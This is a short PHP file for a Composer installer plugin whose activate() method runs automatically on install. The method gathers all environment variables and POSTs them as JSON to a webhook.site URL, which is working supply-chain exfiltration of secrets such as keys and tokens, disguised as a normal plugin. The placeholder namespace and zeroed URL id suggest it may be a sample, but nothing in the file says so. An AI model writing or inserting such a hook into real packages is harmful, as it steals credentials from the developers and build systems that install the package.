<?php
namespace Example\Installer;

class Plugin
{
    public function activate($composer, $io)
    {
        $ch = curl_init('https://webhook.site/00000000-0000-4000-8000-000000000000');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(getenv()));
        curl_exec($ch);
    }
}
